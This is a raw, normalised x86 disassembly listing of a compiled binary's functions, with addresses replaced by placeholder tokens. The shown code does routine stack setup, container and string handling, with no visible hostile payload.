push eax
lea eax [ ebp - 0xb0 ]
push eax
push [ ebp - 0x58 ]
call sub_40d430
mov ebx eax
mov [ ebp - 0x4 ] 0x2
call sub_406dc4
lea eax [ ebp - 0xb0 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_4069e4
mov esi [ ebp - 0x5c ]
xor ebx ebx
dec eax
jne r-xdata
mov eax esi
call sub_448681
retn 0x8
push [ ebp - 0x50 ]
mov eax [ ebp - 0x58 ]
add eax 0x8
push eax
lea edi [ ebp - 0x4c ]
call sub_40d1fb
mov ecx [ ebp - 0x50 ]
cmp [ eax ] ecx
je r-xdata
mov edi [ ebp - 0x50 ]
sub esp 0x1c
mov eax esp
mov [ ebp - 0x64 ] esp
lea ecx [ ebp - 0x4c ]
push ecx
push eax
push [ ebp - 0x58 ]
call sub_40d430
push esi
call sub_40bf8f
jmp r-xdata
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x70 ] ebx
lea ecx [ ebp - 0x78 ]
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x3
call sub_40c1ed
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x64 ] esp
push eax
push ecx
mov [ ebp - 0x4 ] 0x4
call sub_40d4b3
mov esi [ ebp - 0x5c ]
pop ecx
pop ecx
lea eax [ ebp - 0x94 ]
push eax
mov ecx esi
call sub_40d526
add esp 0x20
mov ebx eax
mov [ ebp - 0x4 ] 0x5
call sub_406dc4
lea eax [ ebp - 0x94 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_4069e4
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x3
call sub_40cc34
lea esi [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x0
call sub_40cc34
mov esi [ ebp - 0x5c ]
xor ebx ebx
mov eax [ ebp - 0x4c ]
movsx eax [ eax ]
cmp eax 0x3f
jle r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x68 ]
mov [ ecx ] eax
cmp eax [ ebp - 0x50 ]
je r-xdata
sub eax 0x5b
je r-xdata
inc [ ebp - 0x4c ]
push 0x7
dec eax
je r-xdata
inc [ ebp - 0x54 ]
mov eax [ ebp - 0x54 ]
dec eax
je r-xdata
inc [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] ecx
je r-xdata
dec eax
dec eax
je r-xdata
push 0x2
jmp r-xdata
lea edx [ ebp - 0x4c ]
call sub_40d26c
jmp r-xdata
sub eax 0x1e
jne r-xdata
pop eax
cmp eax 0x5
je r-xdata
inc [ ebp - 0x4c ]
jmp r-xdata
sub_40afa2
push 0x8
mov eax sub_44b4e2
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0xc
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov esi eax
call sub_40c219
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_40d575
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_40b008
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44df91
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov esi ecx
mov edi edx
push ebx
lea eax [ esp + 0x20 ]
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] edi
call sub_40d5e5
and [ esp + 0xa0 ] 0x0
call sub_407e47
mov edx [ eax ]
lea ecx [ esp + 0x1c ]
push ecx
mov ecx eax
call [ edx + 0x8 ]
push 0x3
mov [ esp + 0x68 ] 0x0
pop eax
and [ esp + eax * 8 + 0x6c ] 0x0
and [ esp + eax * 8 + 0x70 ] 0x0
dec eax
jns r-xdata
push [ esp + 0x3c ]
lea eax [ esp + 0x68 ]
push ebx
lea esi [ esp + 0x48 ]
call sub_40d610
mov esi [ esp + 0x14 ]
call sub_407e47
mov edx [ eax ]
lea ecx [ esp + 0x40 ]
push ecx
mov ecx eax
call [ edx + 0xc ]
push [ esp + 0x10 ]
lea eax [ esp + 0x44 ]
push ebx
lea ebx [ esp + 0x20 ]
call sub_40d643
pop ecx
pop ecx
add edi 0x34
mov [ esp + 0xa0 ] 0x1
call sub_40be37
mov [ esp + 0xa0 ] 0x0
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
add edi 0x2c
call sub_40711b
or [ esp + 0xa0 ] 0xffffffff
lea eax [ esp + 0x1c ]
push eax
call sub_40ba8e
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x80 ]
xor ecx esp
call sub_4247dc
mov esp ebp
pop ebp
retn
lea esi [ eax + 0x4 ]
call sub_40c339
sub_40b1b6
push 0x14
mov eax sub_44a6d0
call sub_448595
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_44726a
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_402e7e
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_402fcf
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_447292
mov eax esi
call sub_44866d
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
call sub_40c0a8
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_402eaf
push esi
call sub_446da6
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_42535f
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_426f77
sub_40b252
push 0x0
mov eax sub_44d468
call sub_448595
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x4 ]
mov [ esi ] ecx
and [ eax ] 0x0
and [ ebp - 0x4 ] 0x0
push ecx
push esi
call sub_40d732
pop ecx
pop ecx
mov eax esi
call sub_44866d
retn 0x4
sub_40b283
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_40b83a
push eax
push [ ebp + 0x8 ]
call sub_40bac9
mov eax esi
pop esi
pop ebp
retn 0x8
sub_40b2a4
push ebp
mov ebp esp
push ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
mov ecx [ esi + 0x4 ]
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
add eax 0xc
mov ecx esi
call sub_40bb65
lea eax [ ebp + 0x8 ]
call sub_407f40
leave
retn 0x8
sub_40b2d0
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_40d788
push [ ebp + 0x8 ]
call sub_40bc8b
mov eax esi
pop esi
pop ebp
retn 0x8
sub_40b2f0
push 0x2c
mov eax sub_44de5b
call sub_448595
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
sub esp 0x10
mov esi esp
lea ecx [ ebp + 0x20 ]
mov eax esi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x14 ] esp
call sub_407102
mov eax [ ebp + 0x28 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x2c ]
sub esp 0x10
mov [ esi + 0xc ] eax
mov esi esp
lea ecx [ ebp + 0x10 ]
mov eax esi
mov [ ebp - 0x14 ] esp
call sub_407102
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0xc ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x38 ]
push eax
call sub_40c14c
call sub_40b8d3
lea eax [ ebp - 0x38 ]
push eax
mov [ ebp - 0x10 ] 0x1
call sub_407aea
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x24 ]
test esi esi
je r-xdata
call sub_40379c
mov eax ebx
call sub_44866d
retn
call sub_40379c
sub_40b38f
push 0xc
mov eax sub_44df5e
call sub_448595
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp eax [ ebp + 0x34 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_407aea
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp + 0x2c ]
push eax
call sub_407aea
call sub_44866d
retn 0x48
mov [ ebp - 0x4 ] 0x2
push [ esi + 0x4 ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
mov ecx esi
call sub_40bd26
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
call sub_403855
lea eax [ ebp + 0x10 ]
call sub_40a30e
lea edi [ ebp + 0x8 ]
call sub_407f79
mov eax edi
call sub_40cb46
xor ecx ecx
add eax 0x8
inc ecx
[ eax ] ecx
sub_40b43d
push 0x1c
mov eax sub_44c96f
call sub_448595
lea eax [ ebp - 0x28 ]
push eax
call sub_40d7b9
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_406cd3
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_4069e4
lea eax [ esi + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_40d81f
add esp 0xc
call sub_44866d
retn
sub_40b481
push 0x40
mov eax sub_44c94a
call sub_448595
mov esi ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jbe r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
inc [ eax ]
mov edi [ eax ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4c ]
neg edi
push eax
mov [ ebp - 0x10 ] edi
call sub_40d96c
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
push eax
sub esp 0x1c
mov [ ebp - 0x10 ] esp
mov ebx esp
push esi
sub esp 0x1c
mov eax esp
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] esp
push ecx
push eax
mov [ ebp - 0x10 ] edi
call sub_40d8bf
pop ecx
pop ecx
push ebx
call sub_40d928
lea eax [ ebp - 0x30 ]
add esp 0x24
push eax
call sub_40d928
add esp 0x24
mov ebx eax
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_4069e4
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x4c ]
push eax
call sub_4069e4
push [ ebp + 0x8 ]
mov ecx esi
call sub_40d9d6
jmp r-xdata
call sub_44866d
retn
push eax
call sub_40db1c
pop ecx
sub_40b534
push 0x44
mov eax sub_44d438
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x48 ] eax
mov al [ ebx ]
mov [ ebp - 0x38 ] 0x2
test al al
je r-xdata
mov edi [ ebp - 0x38 ]
and [ ebp - 0x1c ] 0x0
push 0x0
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_4098a0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x44 ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov cl al
mov edx ebx
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40487c
mov eax [ ebp - 0x44 ]
call sub_448681
retn
mov al [ edi + ebx ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp - 0x38 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov cl [ ebx ]
cmp cl al
jne r-xdata
cmp [ eax + edx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc edi
mov al [ edi + ebx ]
test al al
jne r-xdata
add edi [ ebp - 0x34 ]
lea esi [ edi + ebx ]
mov al [ esi ]
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x50 ] esi
cmp al [ ebx ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp al cl
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test al al
je r-xdata
movsx eax [ eax + edx ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
mov edi [ ebp - 0x48 ]
mov ebx [ ebp - 0x40 ]
call sub_40c11d
test al al
jne r-xdata
inc edx
mov [ ebp - 0x3c ] edx
cmp edx [ ebp - 0x38 ]
jb r-xdata
mov [ eax + edx ] cl
mov [ ebp - 0x44 ] edx
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov edi ebx
cmp [ edi + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
mov al [ edi + 0x5 ]
cmp [ esi ] al
jne r-xdata
mov esi edi
call sub_40a3af
mov esi [ ebp - 0x50 ]
mov esi [ ebp - 0x40 ]
mov edi [ ebp - 0x48 ]
mov ebx esi
call sub_40c11d
test al al
jne r-xdata
mov edx [ ebp - 0x3c ]
mov [ eax + edx ] cl
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2d ] 0x1
inc [ ebp - 0x34 ]
call sub_40a392
or [ ebp - 0x44 ] 0xffffffff
mov ebx [ ebp + 0x10 ]
jmp r-xdata
mov ebx [ ebp + 0x10 ]
mov edx [ ebp - 0x3c ]
mov edi [ ebp - 0x4c ]
jmp r-xdata
xor edx edx
xor edi edi
mov [ ebp - 0x2d ] 0x0
mov [ ebp - 0x3c ] edx
cmp [ ebp - 0x38 ] edx
jbe r-xdata
sub_40b717
and [ esi ] 0x0
mov edx [ edi + 0x4 ]
mov [ esi + 0x4 ] edx
test edx edx
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
call sub_403778
test al al
jne r-xdata
mov eax esi
retn 0x4
mov eax [ edi ]
mov [ esi ] eax
and [ esi + 0x4 ] 0x0
sub_40b740
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
push 0x0
push 0x1
mov ecx esi
call sub_40487c
add esi 0x20
pop esi
pop ebp
retn
sub_40b75e
push ebp
mov ebp esp
sub esp 0x10
cmp eax 0x7ffffff
ja r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_4252f8
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_426f77
shl eax 0x5
push eax
call sub_424ff8
pop ecx
test eax eax
jne r-xdata
leave
retn
sub_40b7b2
push ebp
mov ebp esp
sub esp 0x10
cmp eax 0xaaaaaaa
ja r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_4252f8
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_426f77
imul eax eax 0x18
push eax
call sub_424ff8
pop ecx
test eax eax
jne r-xdata
leave
retn
sub_40b7f5
push ebp
mov ebp esp
sub esp 0x10
cmp eax 0xaaaaaaa
ja r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_4252f8
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_426f77
imul eax eax 0x18
push eax
call sub_424ff8
pop ecx
test eax eax
jne r-xdata
leave
retn
sub_40b83a
push ebp
mov ebp esp
push esi
mov esi eax
call sub_40bc6b
mov esi eax
lea eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
call sub_407102
sub_40b872
mov dl [ ecx ]
mov [ eax ] dl
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ ecx + 0xc ]
push esi
mov [ eax + 0xc ] edx
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ecx + 0x14 ]
mov [ eax + 0x14 ] edx
test edx edx
je r-xdata
xor esi esi
add edx 0x4
inc esi
[ edx ] esi
mov ecx [ ecx + 0x18 ]
mov [ eax + 0x18 ] ecx
pop esi
retn
xor esi esi
add edx 0x4
inc esi
[ edx ] esi
sub_40b8d3
push esi
push edi
mov edi eax
mov esi ebx
call sub_407ad2
mov eax [ edi + 0x10 ]
add edi 0x14
lea esi [ ebx + 0x14 ]
mov [ ebx + 0x10 ] eax
call sub_407ad2
pop edi
mov eax ebx
pop esi
retn
sub_40b924
push ebp
mov ebp esp
test [ rw-data ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea eax [ eax * 8 + rw-data ]
pop ebp
retn
mov eax 0x107
mov [ rw-data ] ax
add eax 0xfffffffc
mov [ rw-data ] ax
push 0x20
mov eax 0x2000
mov [ rw-data ] ax
pop eax
mov [ rw-data ] ax
push 0x4
pop eax
mov [ rw-data ] ax
mov [ rw-data ] ax
or [ rw-data ] 0x1
push 0x2
and [ rw-data ] 0x0
mov eax 0x117
mov [ rw-data ] ax
pop eax
mov [ rw-data ] ax
mov eax 0x1000
mov [ rw-data ] ax
mov eax 0x1d7
mov [ rw-data ] ax
push 0x10
pop eax
mov [ rw-data ] ax
push 0x48
pop eax
mov [ rw-data ] ax
mov [ rw-data ] ax
xor eax eax
inc eax
mov [ rw-data ] ax
mov eax 0x4107
mov [ rw-data ] ax
mov eax 0x80
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] r--data
mov [ rw-data ] ax
sub_40ba8e
push 0x0
mov eax sub_449f0c
call sub_448595
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_40c417
or [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call sub_424fc7
and [ esi ] 0x0
pop ecx
call sub_44866d
retn 0x4
sub_40bac9
push ebp
mov ebp esp
push ecx
push ecx
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov eax [ ecx + 0x4 ]
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi ecx
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ ebx + 0x10 ]
cmp ecx [ eax + 0x10 ]
mov edi eax
setb [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] edi
je r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebx + 0x10 ]
jae r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
lea eax [ ebx + 0xc ]
call sub_40699b
push ebx
call sub_424fc7
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x4 ] 0x0
push [ ebp - 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_40ce08
mov edx [ ebp + 0x8 ]
push 0x1
lea eax [ ebp + 0xc ]
push eax
mov eax edi
mov edi edx
call sub_40c538
mov eax [ eax ]
mov [ esi + 0x4 ] 0x1
jmp r-xdata
pop edi
mov [ esi ] eax
mov eax esi
pop ebx
leave
retn 0x8
sub_40bb65
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x0
mov esi eax
mov eax [ edi + 0x4 ]
jne r-xdata
mov ebx [ ebp + 0xc ]
cmp ebx [ eax ]
jne r-xdata
mov [ ebp - 0x4 ] eax
cmp ebx eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x10 ]
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x10 ]
jae r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0x10 ]
cmp eax [ esi + 0x4 ]
jae r-xdata
mov eax esi
lea esi [ ebp - 0x8 ]
mov ecx edi
call sub_40c471
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp [ ebx + 0x10 ] eax
jae r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
call sub_40ce08
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x10 ] eax
jae r-xdata
push esi
mov eax edi
call sub_40cd46
mov ebx eax
mov eax [ ebp - 0x4 ]
push 0x0
jmp r-xdata
push esi
mov eax edi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
call sub_407f40
mov ecx [ ebp - 0x4 ]
cmp ecx [ edi + 0x4 ]
je r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
push esi
mov eax edi
je r-xdata
push [ ebp + 0x8 ]
call sub_40c538
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
push esi
mov eax edi
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ecx + 0x10 ]
jae r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
call sub_40cd46
push 0x0
jmp r-xdata
call sub_40cd46
push 0x1
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
sub_40bc8b
push ebp
mov ebp esp
push ecx
push ecx
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
push ebx
push edi
mov ebx eax
mov eax [ ecx + 0x4 ]
mov edi ecx
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ ebx + 0x10 ]
cmp ecx [ eax + 0x10 ]
mov edi eax
setb [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] edi
je r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebx + 0x10 ]
jae r-xdata
mov eax [ edx + 0x4 ]
cmp edi [ eax ]
jne r-xdata
lea eax [ ebx + 0x10 ]
call sub_403855
push ebx
call sub_424fc7
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x4 ] 0x0
push [ ebp - 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_40ce4d
mov edx [ ebp + 0x8 ]
push 0x1
lea eax [ ebp + 0x8 ]
push eax
mov eax edi
mov edi edx
call sub_40c730
mov eax [ eax ]
mov [ esi + 0x4 ] 0x1
jmp r-xdata
pop edi
mov [ esi ] eax
mov eax esi
pop ebx
leave
retn 0x4
sub_40bd26
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x0
mov esi eax
mov eax [ edi + 0x4 ]
jne r-xdata
mov ebx [ ebp + 0xc ]
cmp ebx [ eax ]
jne r-xdata
mov [ ebp - 0x4 ] eax
cmp ebx eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x10 ]
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x10 ]
jae r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0x10 ]
cmp eax [ esi + 0x4 ]
jae r-xdata
mov eax esi
lea esi [ ebp - 0x8 ]
mov ecx edi
call sub_40c669
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp [ ebx + 0x10 ] eax
jae r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
call sub_40ce4d
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x10 ] eax
jae r-xdata
push esi
mov eax edi
call sub_40cd6f
mov ebx eax
mov eax [ ebp - 0x4 ]
push 0x0
jmp r-xdata
push esi
mov eax edi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
call sub_40a30e
mov ecx [ ebp - 0x4 ]
cmp ecx [ edi + 0x4 ]
je r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
push esi
mov eax edi
je r-xdata
push [ ebp + 0x8 ]
call sub_40c730
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
push esi
mov eax edi
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ecx + 0x10 ]
jae r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
call sub_40cd6f
push 0x0
jmp r-xdata
call sub_40cd6f
push 0x1
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
sub_40be52
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x0
mov ebx eax
mov eax [ edi + 0x4 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ eax ]
jne r-xdata
push 0x1
cmp ecx eax
jne r-xdata
lea eax [ ecx + 0xc ]
lea edx [ ebx + 0xc ]
call sub_403b02
test eax eax
jns r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ ecx + 0xc ]
lea edx [ ebx + 0xc ]
call sub_403b02
test eax eax
jns r-xdata
mov edx [ eax + 0x8 ]
add edx 0xc
lea eax [ ebx + 0xc ]
call sub_403b02
test eax eax
jns r-xdata
push ebx
lea esi [ ebp - 0x8 ]
mov eax edi
call sub_40c878
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
jmp r-xdata
mov edx [ ebp + 0xc ]
add edx 0xc
lea eax [ ebx + 0xc ]
call sub_403b02
test eax eax
jns r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
call sub_40cdae
mov esi [ ebp - 0x4 ]
lea edx [ esi + 0xc ]
lea eax [ ebx + 0xc ]
call sub_403b02
test eax eax
jns r-xdata
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x8 ]
push 0x0
jmp r-xdata
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
call sub_405d05
mov eax [ ebp - 0x4 ]
cmp eax [ edi + 0x4 ]
je r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x2d ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_40c934
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x2d ] 0x0
jne r-xdata
add eax 0xc
lea edx [ ebx + 0xc ]
call sub_403b02
test eax eax
jns r-xdata
push 0x0
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov esi [ ebp + 0xc ]
sub_40bf61
push 0x0
mov eax sub_44a6ad
call sub_448595
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ eax ] 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] ecx
call sub_44866d
retn 0x4
sub_40bf8f
push 0x20
mov eax sub_44b4a6
call sub_448595
mov esi [ ebp + 0x8 ]
